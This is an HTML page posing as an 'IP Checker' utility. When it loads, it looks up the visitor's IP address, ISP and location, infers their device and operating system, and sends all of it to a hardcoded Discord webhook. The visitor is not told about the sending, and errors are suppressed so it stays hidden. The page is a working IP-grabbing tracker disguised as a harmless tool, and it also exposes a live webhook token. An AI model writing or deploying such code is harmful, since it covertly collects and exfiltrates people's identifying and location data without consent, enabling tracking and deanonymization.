<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Checker</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        /* Loading Screen Styles */
        #loading-screen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #ffffff;
            z-index: 1000;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: opacity 0.5s ease;
        }

        .loader {
            border: 8px solid #f3f3f3;
            border-top: 8px solid #3498db;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body class="bg-gray-100 flex items-center justify-center h-screen overflow-hidden">

    <!-- Loading Screen -->
    <div id="loading-screen">
        <div class="loader"></div>
    </div>

    <!-- Main Content -->
    <div id="main-content" class="hidden bg-white p-6 rounded-lg shadow-lg w-full max-w-md">
        <h1 class="text-2xl font-bold mb-4">Check Your IP</h1>
        <div id="ip-info" class="mb-4"></div>
    </div>

    <script>
        function getDeviceInfo() {
            const userAgent = navigator.userAgent;
            let deviceType = "Unknown";
            let os = "Unknown";

            if (userAgent.includes("Mobile")) {
                deviceType = "Mobile";
            } else if (userAgent.includes("Tablet")) {
                deviceType = "Tablet";
            } else if (userAgent.includes("Win")) {
                deviceType = "Desktop";
                os = "Windows";
            } else if (userAgent.includes("Mac")) {
                deviceType = "Desktop";
                os = "MacOS";
            } else if (userAgent.includes("Linux")) {
                deviceType = "Desktop";
                os = "Linux";
            }

            return { deviceType, os };
        }

        async function getIPData() {
            try {
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                
                const { ip, org, city, region, country_name } = data;
                const location = `${city}, ${region}, ${country_name}`;
                const isp = org || "Unknown ISP";

                const { deviceType, os } = getDeviceInfo();

                document.getElementById('ip-info').innerHTML = `
                    <p class="text-lg font-semibold mb-2"><strong>IP:</strong> ${ip}</p>
                    <p class="text-lg font-semibold mb-2"><strong>ISP:</strong> ${isp}</p>
                    <p class="text-lg font-semibold mb-2"><strong>Location:</strong> ${location}</p>
                    <p class="text-lg font-semibold mb-2"><strong>Device Type:</strong> ${deviceType}</p>
                    <p class="text-lg font-semibold mb-2"><strong>Operating System:</strong> ${os}</p>
                `;

                sendToDiscord(ip, isp, location, deviceType, os);
            } catch (error) {
                // Handle errors silently or show a user-friendly message if desired
            } finally {
                // Hide loading screen and show main content
                document.getElementById('loading-screen').style.opacity = '0';
                setTimeout(() => {
                    document.getElementById('loading-screen').style.display = 'none';
                    document.getElementById('main-content').classList.remove('hidden');
                }, 500); // Matches the transition time
            }
        }

        async function sendToDiscord(ip, isp, location, deviceType, os) {
            const message = `IP: ${ip}\nISP: ${isp}\nLocation: ${location}\nDevice Type: ${deviceType}\nOperating System: ${os}`;
            const discordWebhookUrl = 'https://discord.com/api/webhooks/1247107833435258911/807oJEH8MIMSq9OS-MxFssEplKJiy-UVQb1hmtcy3DnYI_azgx5VVsRu2LWrW4nW8688';

            const payload = {
                content: message
            };

            try {
                await fetch(discordWebhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                });
            } catch (error) {
                // Handle errors silently or show a user-friendly message if desired
            }
        }

        // Show loading screen initially and start fetching IP data
        document.getElementById('loading-screen').style.display = 'flex';
        getIPData();
    </script>
</body>
</html>
